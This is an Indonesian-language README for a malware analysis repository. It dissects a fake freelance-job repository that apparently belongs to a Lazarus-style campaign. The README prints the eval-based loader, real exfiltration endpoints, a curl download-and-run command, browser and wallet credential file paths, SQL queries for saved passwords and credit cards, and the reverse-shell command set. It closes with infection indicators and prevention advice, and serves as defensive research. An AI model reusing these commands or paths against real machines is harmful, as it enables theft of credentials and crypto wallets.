> [!CAUTION]
> Repositori ini mengandung kode berbahaya yang dapat mencuri data dan merusak, jangan menjalankan repositori ini di lingkungan yang tidak dipersiapkan untuk itu.

# Lazarus Malware Analysis

Berawal dari kehebohan media masa mengenai Indodax yang diretas pada 11 september 2024 hingga mengalami kerugian 300 miliar. Awalnya hanya membaca sekilas sampai pada 21 september 2024 diwaktu luang muncul video ini: [Yang Sebenernya Terjadi Pada Indodax - Oscar Darmawan](https://www.youtube.com/watch?v=1S9UQx2j0S4). Saya pun pensaran, "apa yang sebenarnya terjadi?".

Dalam video tersebut dijelaskan, malware masuk melalui salah satu karyawan yang mengambil tawaran kerja freelancer dengan harga tinggi.

Meskipun disebutkan bahwa peretasan itu ditargetkan, sebagai seseorang freelancer sepenuhnya (tidak sedang bekerja di perusahaan lain) saya juga merasa perlu berhati-hati, tapi juga membuat penasaran.

Di platform freelancer kadang-kadang saya sering menemukan beberapa postingan pekerjaan dengan jumlah klien yang diinterview cukup banyak (hampir semua klien yang mengajukan proposal diinterview).

Ini agak janggal, klien seperti ini harus diwaspadai, apalagi jika ini klien baru yang belum memiliki riwayat mempekerjakan freelancer dan belum mendapatkan rating.

Klien normal biasanya menginterview tidak lebih dari 10 freelancer.

Meskipun biasanya saya tidak pernah mengajukan proposal ke klien baru, tapi karena penasaran saya pun mengajukan poposal, kebetulan ada yang lewat di _feed_:

<p align="center">
  <img src="./readme-assets/job-post.png">
</p>

Yang menarik, jumlah freelancer yang diinterview mencapai 60, dan tentu saja menawarkan rate per jam yang cukup tinggi, $60 - $80.

Klien ini juga memposting beberapa lowongan kerja yang terkait dengan kripto.

Setelah mengajukan proposal, saya mendapatkan response dan dia bertanya apakah saya bersedia menjalankan projek ini di sisi saya, tentu saya jawab ya, inilah balasan selanjutnya:

<p align="center">
  <img src="./readme-assets/chat.png">
</p>

Pengembang JavaScript/Node.js yang kurang memperhatikan keamanan secara naluri mungkin akan langsung menjalankan `npm install` lalu `npm run dev` setelah mengkloning projek.

Justru dari sinilah petaka dimulai...

## Titik Masuk

Dengan tetap waspada, saya kemudian mengkloning repositori tersebut [https://bitbucket.org/workspace-web3/homyz/](https://bitbucket.org/workspace-web3/homyz/), saya mulai menelusuri repositori ini di lokal.

Dimulai dari `package.json`, saya memeriksa satu per satu dependensi projek terutama yang kurang familiar, dengan membaca dokumentasi di NPM dan remote git terkait, sekilas tidak ada yang aneh.

Kemudian kita beralih ke scripts, dari 4 perintah yang disediakan semuanya akan menjalankan file `server/server.js`, disini agak janggal, terutama pada perintah `build`, mengapa perintah ini juga menjalankan server? atau mungkin pengembang sebelumnya tidak sempat merapikan perintah-perintah tersebut?, yang pasti file ini layak menjadi titik masuk penelusuran.

Tapi dalam file `server/server.js` tidak ada yang janggal. Saya pun menelusuri file-file lain, dan menemukan file [`server/controllers/productController.js`](./homyz/server/controllers/productController.js#L158-L163) yang mengandung fungsi `checkRegion`. Fungsi ini dibuat dan langsung dipanggil.

Fungsi `checkRegion` membuat permintaan HTTP: `GET http://regioncheck.net/api/user/thirdcookie/v3/726`, dengan response json ([cookie-raw.txt](./malware-artefak/cookie-raw.txt)) yang mendangung kode JavaScript berbahaya yang di-obfuscation, kemudian bagian `eval(res.data.cookie)`, mengeksekusi kode tersebut.

Sekilas, berikut adalah alur malware yang ditemukan.

<p align="center">
  <img src="./readme-assets/malware-flow.png">
</p>

## Mempelajari Perilaku "kode cookie"

Untuk mempelajari perilaku kode berbahaya tersebut kita perlu men-deobfuscate, ini hasilnya: [analysis/playground/cookie/readable-cookie.js](./analysis/playground/cookie/readable-cookie.js).

### Deobfuscate

Selama proses deobfuscate, kita perlu merapikan kode untuk keterbacaan. Namun, ada beberapa kode yang mencoba mencegah proses ini, ketika kode dirapikan menggunakan prettier saja perilakunya berubah.

Oleh karena itu beberapa bagian kode diberi komentar agar hal ini tidak terjadi. Selain itu output console juga coba dimatikan.

Setelah menelusuri, peretas mungkin menggunakan alat [https://obfuscator.io/](https://obfuscator.io/) dengan opsi `deadCodeInjection` dan `disableConsoleOutput` karena perilaku dan kode yang dihasilkan identik.

### Mencuri Data Ekstensi Browser

Pertama-tama "kode cookie" memindai file yang cocok dengan pola glob berikut:

**Google Chrome**

```sh
# MacOS
$HOME/Library/Application Support/Google/Chrome/{Default,Profile *[0-9]}/Local Extension Settings/**
# Windows
$HOME/AppData/Local/Google/Chrome/User Data/{Default,Profile *[0-9]}/Local Extension Settings/**
# Linux
$HOME/.config/google-chrome/{Default,Profile *[0-9]}/Local Extension Settings/**
```

**Microsoft Edge**

```sh
# Windows
$HOME/AppData/Local/Microsoft/Edge/User Data/{Default,Profile *[0-9]}/Local Extension Settings/**
```

**Brave**

```sh
# MacOS
$HOME/Library/Application Support/BraveSoftware/Brave-Browser/{Default,Profile *[0-9]}/Local Extension Settings/**
# Windows
$HOME/AppData/Local/BraveSoftware/Brave-Browser/User Data/{Default,Profile *[0-9]}/Local Extension Settings/**
# Linux
$HOME/.config/BraveSoftware/Brave-Browser/{Default,Profile *[0-9]}/Local Extension Settings/**
```

**Opera**

```sh
# MacOS
$HOME/Library/Application Support/com.operasoftware.Opera/{Default,Profile *[0-9]}/Local Extension Settings/**
# Windows
$HOME/AppData/Roaming/Opera Software/Opera Stable/User Data/{Default,Profile *[0-9]}/Local Extension Settings/**
# Linux
$HOME/.config/opera/{Default,Profile *[0-9]}/Local Extension Settings/**
```

**Mozilla Firefox**

Khusus untuk firefox hanya merujuk ke tempat yang valid di Windows.

```sh
$HOME/AppData/Roaming/Mozilla/Firefox/Profiles/*-release*/storage/default/*moz-extension*/idb/*.files*/**
```

Pola-pola glob diatas merujuk ke pengaturan dan preferensi ekstensi, cache, data sementara, histori, data pengguna, IndexDB, LocalStorage dan data browser lainnya.

File-file ini kemudian dikirim ke: `POST http://45.89.53.59:1224/uploads`

File yang mengandung nama `.log` atau `.ldb` langsung di kirim ke server. Jika nama file tidak mengandung salah satu teks tersebut, selain dikirim ke server, file juga disalin ke `$HOME/.n3/tp`.

### Mencuri Private Key Solana dan Exodus Wallet

Malware ini juga mencuri file yang berada di:

```sh
$HOME/.config/solana/id.json
```

File ini berisi kunci pribadi (private key) yang biasa [digunakan untuk melakukan transaksi dan berinteraksi dengan jaringan Solana](https://solana.com/docs/intro/installation#solana-config).

Selain itu, [file `exodus.wallet`](https://www.exodus.com/support/en/articles/8598708-how-do-i-rescue-an-overwritten-wallet#h_a3b62b317d) juga ikut digondol, file ini berisi private keys, alamat wallet, saldo, riwayat transaksi, dan data konfigurasi.

```sh
# windows
$HOME/AppData/Roaming/Exodus/exodus.wallet
# MacOS
$HOME/Library/Application Support/eoxdus.wallet
# (Linux)
$HOME/.config/Exodus/exodus.wallet
```

Kedua file tersebut dikirim ke tempat yang sama dan disalin ke `$HOME/.n3/tp`.

### Mencuri `login.keychain` dan Login Data Browser di MacOS

[File login.keychain di macOS](https://support.apple.com/guide/keychain-access/what-is-keychain-access-kyca1083/mac) yang dicuri peretas berada di:

```sh
$HOME/Library/Keychains/login.keychain
# atau
$HOME/Library/Keychains/login.keychain-db
```

Untuk data login browser:

```sh
# Google Chrome
$HOME/Library/Application Support/Google/Chrome/{Default,Profile *[0-9]}/Login Data
$HOME/Library/Application Support/Google/Chrome/ld_*[0-9]*
# Brave
$HOME/Library/Application Support/BraveSoftware/Brave-Browser/{Default,Profile *[0-9]}/Login Data
```

### Mencuri Local State dan Login Data Browser Selain di MacOS

Direktori `Local State` menyimpan status sinkronisasi, preferensi pengguna, dan pengaturan yang berhubungan dengan privasi dan keamanan, token autentikasi layanan Google dan lainnya.

**Google Chrome**

```sh
# Windows
$HOME/AppData/Local/Google/Chrome/User Data/Local State
$HOME/AppData/Local/Google/Chrome/User Data/{Default,Profile *[0-9]}/Login Data
# Linux
$HOME/.config/google-chrome/Local State
$HOME/.config/google-chrome/{Default,Profile *[0-9]}/Login Data
```

**Brave**

```sh
# Windows
$HOME/AppData/Local/BraveSoftware/Brave-Browser/User Data/Local State
$HOME/AppData/Local/BraveSoftware/Brave-Browser/User Data/{Default,Profile *[0-9]}/Login Data
# Linux
$HOME/.config/BraveSoftware/Brave-Browser/Local State
$HOME/.config/BraveSoftware/Brave-Browser/{Default,Profile *[0-9]}/Login Data
```

**Opera**

```sh
# Windows
$HOME/AppData/Roaming/Opera Software/Opera Stable/User Data/Local State
$HOME/AppData/Roaming/Opera Software/Opera Stable/User Data/{Default,Profile *[0-9]}/Login Data
# Linux
$HOME/.config/opera/Local State/**
$HOME/.config/opera/{Default,Profile *[0-9]}/Login Data/**
```

### Menginstall Python, Mengunduh, dan Mengeksekusi File `.npl`

Selain mencuri data, malware ini juga mengunduh file python yang didapatkan dari HTTP request: `GET http://45.89.53.59:1224/client/3/726` server meresponse dengan konten seperti yang terlihat di file [malware-artefak/.npl](./malware-artefak/.npl), ini disimpan di `$HOME/.npl`.

Khusus untuk Windows, jika Python belum diinstall malware ini akan menginstallnya dengan menjalankan perintah `curl -Lo $ENV:TMP\p2.zip http://45.89.53.59:1224/pdown`

Segera setelah python dipastikan terinstall dengan baik, file `.npl` akan dieksekusi dengan perintah `$HOME\.pyp\python.exe $HOME\.npl` untuk Windows, atau `pyton3 $HOME/.npl` untuk MacOS dan Linux.

## Mempelajari Perilaku File `.npl`

```py
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
exec((_)(b'DANGER_BYTES_LITERAL'))
```

File `.npl` berisi fungsi lambda Python yang dideklarasikan dengan nama `_` dan menerima dengan argumen `__`, fungsi ini bekerja dengan membalikkan string argumen, hasilnya lalu didekode dengan base64 decoder, kemudian didekompresi dengan zlib.

Fungsi lambda ini kemudian dipanggil dengan parameter bytes literal yang berbahaya, kemudian hasilnya di `exec` mirip dengan `eval` di JavaScript yang digunakan sebelumnya.

Untuk mengetahui apa yang sebenarnya terjadi, saya meniru fungsi lambda tersebut [analysis/utilities.js](./analysis/utilities.js) dan memanggilnya dengan bytes literal yang sama. Ketika dijalankan bytes literal ini ternyata menghasilkan `exec((_)(b'DANGER_BYTES_LITERAL'))` terus-menerus sampai pada putaran 50 menghasilkan kode python [analysis/playground/npl/npl-decoded.py](./analysis/playground/npl/npl-decoded.py).

Menariknya ketika dieksekusi file ini akan melahirkan 3 file baru yang diambil dari server peretas, dan ketiganya langsung dieksekusi secara berurutan.

Berikut ketiga file tersebut dan darimana file diambil:

[**$HOME/.n2/pay**](./malware-artefak/.n2/pay)

```sh
GET http://45.89.53.59:1224/payload/3/726
```

[**$HOME/.n2/bow**](./malware-artefak/.n2/bow)

```sh
GET http://45.89.53.59:1224/brow/3/726
```

[**$HOME/.n2/mlip**](./malware-artefak/.n2/mlip)

```sh
GET http://45.89.53.59:1224/mclip/3/726
```

MacOS hanya mengeksekusi file `$HOME/.n2/pay`, sedangkan Windows dan Linux mengeksekusi ketiga file tersebut.

Sebegitu pentingkah file `$HOME/.n2/pay` sehingga harus dieksekusi di 3 OS tersebut? Ternyata disinilah operasi yang lebih canggih dimulai.

## `.n2/pay`: Remote Code Execution, Reverse Shell, dan Data Exfiltration

File ini tampaknya memiliki mekanisma yang sedikit lebih canggih, malware membuat koneksi TCP soket ke server peretas yang memungkinkan peretas menjalankan perintah shell arbitrer di komputer korban, merekam ketikan keyboard, clipboard, mencuri data terkait kripto dan lainnya.

### Mencuri Informasi Sistem dan Jaringan

Data korban yang dikumpulkan (data disamarkan):

```js
{
  ts: "{int(time.time()*1000)}",
  type: "3",
  hid: "726_{socket.gethostname()}",
  ss: "sys_info",
  cc: {
    sys_info: {
      uuid: "{sha256((str(uuid.getnode())+getpass.getuser()).encode()).digest().hex()}",
      system: "{platform.system()}",
      release: "{platform.release()}",
      version: "{platform.version()}",
      hostname: "726_{socket.gethostname()}",
      username: "{getpass.getuser()}",
    },
    // http://ip-api.com/json
    net_info: {
      lat: -0.000,
      lon: 000.000,
      zip: "",
      isp: "PT. ISP KONOHA",
      city: "KONOHA",
      query: "127.0.0.1",
      country: "KONOHA",
      timezone: "KONOHA",
      regionName: "KONOHA",
      internalIp: "",
    },
  },
}
```

Kemudian dikirim: `POST http://45.89.53.59:1224/keys`

### Mencuri Informasi Kripto dan .env File

Malware ini juga menjalankan perintah shell pencarian file atau direktori yang mengandung teks terkait kripto:

`*mnemonic*`

```sh
# Windows
dir /b /s *mnemonic* | findstr /v /i "node_modules .css .svg readme license robots vendor Pods .git .github .node-gyp .nvm debug .local .cache .pyp .pyenv next.config .qt .dex __pycache__ tsconfig.json tailwind.config svelte.config vite.config webpack.config postcss.config prettier.config angular-config.json yarn .gradle .idea .htm .html .cpp .h .xml .java .lock .bin .dll .pyi"

# Linux, MacOS
find . -type d -name "node_modules .css .svg readme license robots vendor Pods .git .github .node-gyp .nvm debug .local .cache .pyp .pyenv next.config .qt .dex __pycache__ tsconfig.json tailwind.config svelte.config vite.config webpack.config postcss.config prettier.config angular-config.json yarn .gradle .idea .htm .html .cpp .h .xml .java .lock .bin .dll .pyi" -prune -o -name *mnemonic* -print
```

`*metamask*`

```sh
# Windows
dir /b /s *metamask* | findstr /v /i "node_modules .css .svg readme license robots vendor Pods .git .github .node-gyp .nvm debug .local .cache .pyp .pyenv next.config .qt .dex __pycache__ tsconfig.json tailwind.config svelte.config vite.config webpack.config postcss.config prettier.config angular-config.json yarn .gradle .idea .htm .html .cpp .h .xml .java .lock .bin .dll .pyi"

# Linux, MacOS
find . -type d -name "node_modules .css .svg readme license robots vendor Pods .git .github .node-gyp .nvm debug .local .cache .pyp .pyenv next.config .qt .dex __pycache__ tsconfig.json tailwind.config svelte.config vite.config webpack.config postcss.config prettier.config angular-config.json yarn .gradle .idea .htm .html .cpp .h .xml .java .lock .bin .dll .pyi" -prune -o -name *metamask* -print
```

`*wallet*`

```sh
# Windows
dir /b /s *wallet* | findstr /v /i "node_modules .css .svg readme license robots vendor Pods .git .github .node-gyp .nvm debug .local .cache .pyp .pyenv next.config .qt .dex __pycache__ tsconfig.json tailwind.config svelte.config vite.config webpack.config postcss.config prettier.config angular-config.json yarn .gradle .idea .htm .html .cpp .h .xml .java .lock .bin .dll .pyi"

# Linux, MacOS
find . -type d -name "node_modules .css .svg readme license robots vendor Pods .git .github .node-gyp .nvm debug .local .cache .pyp .pyenv next.config .qt .dex __pycache__ tsconfig.json tailwind.config svelte.config vite.config webpack.config postcss.config prettier.config angular-config.json yarn .gradle .idea .htm .html .cpp .h .xml .java .lock .bin .dll .pyi" -prune -o -name *wallet* -print
```

`*seed*`

```sh
# Windows
dir /b /s *seed* | findstr /v /i "node_modules .css .svg readme license robots vendor Pods .git .github .node-gyp .nvm debug .local .cache .pyp .pyenv next.config .qt .dex __pycache__ tsconfig.json tailwind.config svelte.config vite.config webpack.config postcss.config prettier.config angular-config.json yarn .gradle .idea .htm .html .cpp .h .xml .java .lock .bin .dll .pyi"

# Linux, MacOS
find . -type d -name "node_modules .css .svg readme license robots vendor Pods .git .github .node-gyp .nvm debug .local .cache .pyp .pyenv next.config .qt .dex __pycache__ tsconfig.json tailwind.config svelte.config vite.config webpack.config postcss.config prettier.config angular-config.json yarn .gradle .idea .htm .html .cpp .h .xml .java .lock .bin .dll .pyi" -prune -o -name *seed* -print
```

`truffle.config*`

```sh
# Windows
dir /b /s truffle.config* | findstr /v /i "node_modules .css .svg readme license robots vendor Pods .git .github .node-gyp .nvm debug .local .cache .pyp .pyenv next.config .qt .dex __pycache__ tsconfig.json tailwind.config svelte.config vite.config webpack.config postcss.config prettier.config angular-config.json yarn .gradle .idea .htm .html .cpp .h .xml .java .lock .bin .dll .pyi"

# Linux, MacOS
find . -type d -name "node_modules .css .svg readme license robots vendor Pods .git .github .node-gyp .nvm debug .local .cache .pyp .pyenv next.config .qt .dex __pycache__ tsconfig.json tailwind.config svelte.config vite.config webpack.config postcss.config prettier.config angular-config.json yarn .gradle .idea .htm .html .cpp .h .xml .java .lock .bin .dll .pyi" -prune -o -name truffle.config* -print
```

`hardhat.config*`

```sh
# Windows
dir /b /s hardhat.config* | findstr /v /i "node_modules .css .svg readme license robots vendor Pods .git .github .node-gyp .nvm debug .local .cache .pyp .pyenv next.config .qt .dex __pycache__ tsconfig.json tailwind.config svelte.config vite.config webpack.config postcss.config prettier.config angular-config.json yarn .gradle .idea .htm .html .cpp .h .xml .java .lock .bin .dll .pyi"

# Linux, MacOS
find . -type d -name "node_modules .css .svg readme license robots vendor Pods .git .github .node-gyp .nvm debug .local .cache .pyp .pyenv next.config .qt .dex __pycache__ tsconfig.json tailwind.config svelte.config vite.config webpack.config postcss.config prettier.config angular-config.json yarn .gradle .idea .htm .html .cpp .h .xml .java .lock .bin .dll .pyi" -prune -o -name hardhat.config* -print
```

Selain informasi kripto skrip ini juga mencuri file `.env*` yang biasa digunakan developer untuk menyimpan informasi rahasia. Perintah shell yang digunakan:

`.env*`

```sh
# Windows :: Pencarian dilakukan pada disk ['C', 'D', 'E', 'F', 'G'], contoh disk C:
dir /b /s C:\*.env | findstr /v /i "node_modules .css .svg readme license robots vendor Pods .git .github .node-gyp .nvm debug .local .cache .pyp .pyenv next.config .qt .dex __pycache__ tsconfig.json tailwind.config svelte.config vite.config webpack.config postcss.config prettier.config angular-config.json yarn .gradle .idea .htm .html .cpp .h .xml .java .lock .bin .dll .pyi"

# Linux, MacOS
find ~/ -type d -name "node_modules .css .svg readme license robots vendor Pods .git .github .node-gyp .nvm debug .local .cache .pyp .pyenv next.config .qt .dex __pycache__ tsconfig.json tailwind.config svelte.config vite.config webpack.config postcss.config prettier.config angular-config.json yarn .gradle .idea .htm .html .cpp .h .xml .java .lock .bin .dll .pyi" -prune -o -name *.env -print
```

File-file tersebut kemudian dikirim ke server: `POST http://45.89.53.59:1224/uploads`

Skrip ini juga mencatat daftar file yang telah dikirim ke `$HOME/.n2/flist`.

### Remote Code Execution melalui Koneksi TCP

Malware ini juga akan membuat koneksi TCP ke `45.89.53.59:2243`, dengan cara inilah server dapat mengendalikan apa yang harus dilakukan malware di komputer korban, tak terkecuali mengeksekusi perintah shell arbitrer.

Selain itu, khusus untuk Windows, malware ini menjalankan program perekam ketikan keyboard dan clipboard.

Untuk mengamati perilakunya secara detail, saya membuat [TCP server tiruan](./analysis/playground/n2-pay/socket-server.js) dan mengarahkan malware agar berkomunikasi dengan server tiruan kita alih-alih server peretas.

[Ada 8 fungsi yang disiapkan](./analysis/playground/n2-pay/n2-pay-decoded.py#L239) yang dipetakan ke dalam angka 1 - 8, server tiruan memicu setiap fungsi secara berurutan dan hasilnya dapat dilihat disini: [analysis/playground/n2-pay/client-message.txt](./analysis/playground/n2-pay/client-message.txt)

Peretas dapat memicu fungsi-fungsi ini berkali-kali dan tidak harus berurutan.

Berikut apa yang dilakukan dari setiap fungsi tersebut:

#### 1. `ssh_obj` - Mengeksekusi Perintah Shell Arbitrer

Fungsi ini menerima argumen berupa perintah shell apa pun yang dikirim oleh server peretas dan kemudian dijalankan di komputer korban.

Sayangnya, saya tidak berhasil mendapatkan perintah apa yang dikirim oleh peretas karena server sudah tidak bisa diakses.

#### 2. `ssh_cmd` - Menghentikan Proses Python

Digunakan untuk menghentikan proses Python.

#### 3. `ssh_clip` - Mengambil Hasil Perekam Ketikan Keyboard & Clipboard

Digunakan untuk mengambil hasil program perekam ketikan keboard dan clipboard yang disimpan di variabel `e_buf`.

#### 4. `ssh_run` - Mengunduh & Mengeksekusi File `$HOME/.n2/bow`

Fungsi ini digunakan untuk mengeksekusi dan mengunduh file `$HOME/.n2/bow` dari `GET http://45.89.53.59:1224/brow/3/726` seperti yang dilakukan oleh file `.pay`.

Ini ada mungkin untuk backup, atau mungkin mengunduh file `.bow` lain yang dipersonalisasikan sesuai dengan informasi yang telah didapatkan peretas pada proses-proses sebelumnya.

#### 5. `ssh_upload` - Mencuri File-file Tertentu

Digunakan untuk mencuri file-file tertentu berdasarkan nama file, direktori, atau _pattern_ yang dikirim dari server.

Terdiri dari 3 sub-fungsi:

`sdir`: untuk mencuri direktori tertentu sesuai permintaan server.

`sfile`: untuk mencuri file tertentu sesuai permintaan server.

`sfind`: untuk mencuri file tertentu sesuai dengan pola yang dikirim oleh server. Pola ini kemudian digabungkan dan dieksekusi menjadi perintah:

```sh
# windows
dir /b /s $POLA_SERVER | findstr /v /i "node_modules .css .svg readme license robots vendor Pods .git .github .node-gyp .nvm debug .local .cache .pyp .pyenv next.config .qt .dex __pycache__ tsconfig.json tailwind.config svelte.config vite.config webpack.config postcss.config prettier.config angular-config.json yarn .gradle .idea .htm .html .cpp .h .xml .java .lock .bin .dll .pyi"

# Linux, MacOS
find . -type d -name "node_modules .css .svg readme license robots vendor Pods .git .github .node-gyp .nvm debug .local .cache .pyp .pyenv next.config .qt .dex __pycache__ tsconfig.json tailwind.config svelte.config vite.config webpack.config postcss.config prettier.config angular-config.json yarn .gradle .idea .htm .html .cpp .h .xml .java .lock .bin .dll .pyi" -prune -o -name $POLA_SERVER -print
```

File-file tersebut kemudian dikirim ke: `POST http://45.89.53.59:1224/uploads`

#### 6. `ssh_kill` - Menghentikan Proses Chrome & Brave

Ini digunakan untuk menghentikan semua proses browser Google Chrome dan Brave Browser yang sedang berjalan.

#### 7. `ssh_any` - Mengunduh dan Menjalankan AnyDesk

Digunakan untuk mengunduh aplikasi remote desktop AnyDesk dari `GET http://45.89.53.59:1224/ads/3` yang disimpan di `$HOME/.n2/adc`.

#### 8. `ssh_env` - Mencuri File `.env`

Digunakan untuk mencuri file `.env` seperti pada proses sebelumnya, dengan perintah shell berikut:

```sh
# Windows :: ['C', 'D', 'E', 'F', 'G']
dir /b /s C:\*.env | findstr /v /i "node_modules .css .svg readme license robots vendor Pods .git .github .node-gyp .nvm debug .local .cache .pyp .pyenv next.config .qt .dex __pycache__ tsconfig.json tailwind.config svelte.config vite.config webpack.config postcss.config prettier.config angular-config.json yarn .gradle .idea .htm .html .cpp .h .xml .java .lock .bin .dll .pyi"

# Linux, MacOS
find ~/ -type d -name "node_modules .css .svg readme license robots vendor Pods .git .github .node-gyp .nvm debug .local .cache .pyp .pyenv next.config .qt .dex __pycache__ tsconfig.json tailwind.config svelte.config vite.config webpack.config postcss.config prettier.config angular-config.json yarn .gradle .idea .htm .html .cpp .h .xml .java .lock .bin .dll .pyi" -prune -o -name *.env -print'
```

Seperti biasa, semua file yang berhasil dikirim akan dicatat ke dalam file `$HOME/.n2/flist`.

## Menelusuri Perilaku File `.n2/mlip`

[File ini](./analysis/playground/n2-mlip/n2-mlip-decoded.py) pada dasarnya adalah program python yang digunakan untuk merekam ketika keyboard dan clip board.

Namun, data tersebut kali ini dikirim ke server yang berbeda: `POST http://95.164.7.171:8637/api/clip`

## Menelusuri Perilaku File `.n2/bow`

### Mencuri Data Login

`Login Data` adalah file SQLite yang digunakan browser berbasis chromium untuk menyimpan informasi kredensial yang digunakan untuk login ke berbagai situs web.

Malware ini mengambil informasi dari file tersebut menggunakan query berikut:

```sql
select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created
```

Kolom `password_value` sebetulnya di-encrypt, namun malware ini juga mencoba mendapatkan kunci enkripsi untuk men-decrypt informasi tersebut.

Beberapa file yang ditargetkan:

**Linux**

```sh
# Chrome
$HOME/.config/google-chrome/{Default,Profile *[0-9]}/Login Data,
# Brave
$HOME/.config/BraveSoftware/Brave-Browser/{Default,Profile *[0-9]}/Login Data
# Opera
$HOME/.config/opera{Default,Profile *[0-9]}/Login Data
```

**Windows**

```sh
# Chrome
$HOME/AppData/Local/Google/chrome/User Data/{Default,Profile *[0-9]}/Login Data
# Brave
$HOME/AppData/Local/BraveSoftware/Brave-Browser/User Data/{Default,Profile *[0-9]}/Login Data
# Opera
$HOME/AppData/Roaming/Opera Software/Opera Stable{Default,Profile *[0-9]}/Login Data
# Yandex
$HOME/AppData/Local/Yandex/YandexBrowser/User Data/{Default,Profile *[0-9]}/Local State
# Edge
$HOME/AppData/Local/Microsoft/Edge/User Data/{Default,Profile *[0-9]}/Login Data
```

**MacOS**

```sh
# Chrome
$HOME/Library/Application Support/Google/chrome/{Default,Profile *[0-9]}/Login Data
# Brave
$HOME/Library/Application Support/BraveSoftware/Brave-Browser/{Default,Profile *[0-9]}/Login Data
# Opera
$HOME/Library/Application Support/com.operasoftware.Opera{Default,Profile *[0-9]}/Login Data
```

### Mencuri Kartu Kredit

Meskipun saya tidak yakin peretas berhasil mendapatkannya, karena beberapa path merujuk ke direktori profile alih-alih ke file SQLite `Web Data` tempat dimana data autofill seperti kartu kredit dan data sensitif lainnya disimpan.

Dengan asumsi merujuk ke path yang tepat, peretas akan menjalankan query SQL berikut untuk mendapatkan informasi kartu kredit:

```sql
SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards
```

Beberapa adalah pola glob yang digunakan:

**Linux**

```sh
# Chrome
$HOME/.config/google-chrome/{Default,Profile *[0-9]}
# Brave
$HOME/.config/BraveSoftware/Brave-Browser/{Default,Profile *[0-9]}
# Opera
$HOME/.config/opera{Default,Profile *[0-9]}
```

**Windows**

```sh
# Chrome
$HOME/AppData/Local/Google/chrome/User Data/{Default,Profile *[0-9]}
# Brave
$HOME/AppData/Local/BraveSoftware/Brave-Browser/User Data/{Default,Profile *[0-9]}
# Opera
$HOME/AppData/Roaming/Opera Software/Opera Stable{Default,Profile *[0-9]}
# Yandex
$HOME/AppData/Local/Yandex/YandexBrowser/User Data/{Default,Profile *[0-9]}
# Edge
$HOME/AppData/Local/Microsoft/Edge/User Data/{Default,Profile *[0-9]}
```

**MacOS**

```sh
# Chrome
$HOME/Library/Application Support/Google/chrome/{Default,Profile *[0-9]}
# Brave
$HOME/Library/Application Support/BraveSoftware/Brave-Browser/{Default,Profile *[0-9]}
# Opera
$HOME/Library/Application Support/com.operasoftware.Opera{Default,Profile *[0-9]}
```

Selain itu juga ditemukan path yang tidak valid untuk Opera di MacOS, Windows, dan Linux. Ini mungkin bug malware yang belum diketahui peretas.

Setelah data-data tersebut didapatkan, dikirim ke: `POST http://45.89.53.59:1224/keys`

## Benarkah Ini dari Lazarus?

Berdasarkan perilaku malware yang kita amati, ini identik dengan metode yang biasa digunakan grup peretas Lazarus dari Korea Utara:

- [Hacking Employers and Seeking Employment: Two Job-Related Campaigns Bear Hallmarks of North Korean Threat Actors
  ](https://unit42.paloaltonetworks.com/two-campaigns-by-north-korea-bad-actors-target-job-hunters/)
- [Research Update: Threat Actors Behind the DEV#POPPER Campaign Have Retooled and are Continuing to Target Software Developers via Social Engineering
  ](https://www.securonix.com/blog/research-update-threat-actors-behind-the-devpopper-campaign-have-retooled-and-are-continuing-to-target-software-developers-via-social-engineering/)
- [Fake Developer Jobs Laced With Malware
  ](https://blog.phylum.io/smuggling-malware-in-test-code/)
- [APT Lazarus: Eager Crypto Beavers, Video calls and Games
  ](https://www.group-ib.com/blog/apt-lazarus-python-scripts/)
- [Analysis of DEV#POPPER: New Attack Campaign Targeting Software Developers Likely Associated With North Korean Threat Actors
  ](https://www.securonix.com/blog/analysis-of-devpopper-new-attack-campaign-targeting-software-developers-likely-associated-with-north-korean-threat-actors/)

Tapi jika kita mencari informasi terkait alamat IP yang digunakan peretas, ini identik dengan peretas Rusia. Pemiliki IP ini: `95.164.7.171` dan ini: `45.89.53.59` adalah [Stark Industries Solutions LTD](https://stark-industries.solutions/), perusahaan hosting yang sering dikaitkan dengan peretas Rusia:

- [Stark Industries Solutions: An Iron Hammer in the Cloud
  ](https://krebsonsecurity.com/2024/05/stark-industries-solutions-an-iron-hammer-in-the-cloud/)
- [FIN7 Group Advertises Security-Bypassing Tool on Dark Web Forums
  ](https://thehackernews.com/2024/07/fin7-group-advertises-security.html)
- [From RM3 to LDR4: URSNIF Leaves Banking Fraud Behind
  ](https://cloud.google.com/blog/topics/threat-intelligence/rm3-ldr4-ursnif-banking-fraud/)
- [Exposing TAG-53’s Credential Harvesting Infrastructure Used for Russia-Aligned Espionage Operations
  ](https://www.recordedfuture.com/research/exposing-tag-53-credential-harvesting-infrastructure-for-russia-aligned-espionage-operations)
- [The Stark Truth Behind the Resurgence of Russia’s Fin7
  ](https://krebsonsecurity.com/2024/07/the-stark-truth-behind-the-resurgence-of-russias-fin7/)

## Indikasi Infeksi

Mesin yang terinfeksi malware ini akan memiliki salah satu dan/atau beberapa file berikut:

- `$HOME/.npl`
- `$HOME/.n2/pay`
- `$HOME/.n2/mlip`
- `$HOME/.n2/bow`
- `$HOME/.n2/flist`

Peretas mungkin akan mengubah nama file-file ini atau bahkan menggunakan metode yang berbeda untuk pengaburan jejak.

Untuk memastikan, lihat satu per satu isi file yang ada didalam dot direktori atau file (direktori atau file yang namanya diawali dengan titik).

Atau, cari menggunakan `grep`, perintah dibawah akan mencari file yang mengandung fungsi lambda seperti yang digunakan peretas pada file `.n2/pay` dan `.n2/mlip`, perintah dibawah melakukan pencarian pada direktori `$HOME/.n2` (ubah sesuai kebutuhan):

```sh
grep -ri "_ = lambda __ : __import__('zlib').decompress(__import__('base64')" ~/.n2
```

## Pencegahan

1. Untuk freelancer, hindari klien baru yang belum mendapatkan rating atau job post dengan jumlah interview yang terlalu banyak.
2. Selalu periksa projek sebelum mengkloning atau menginstal dependensi, termasuk memeriksa dependesi projek, maupun _source code_.
3. Jalankan projek di mesin virtual terisolasi atau Docker.
4. Blacklist [IP yang terkait dengan Stark Industries Solutions](https://bgp.he.net/AS44477#_asinfo) melalui Firewall.

## Informasi Malware & Peretas yang Diketahui

Informasi dari pengguna yang membuat komit git:

- Nama: **Jake**
- Email: **jake@intelliorg.de**
- Tanggal komit: **Sun Sep 22 13:41:55 2024 +0400**

IP & domain yang digunakan:

- 45.89.53.59
- 95.164.7.171
- regioncheck.net

File hash (SHA256):

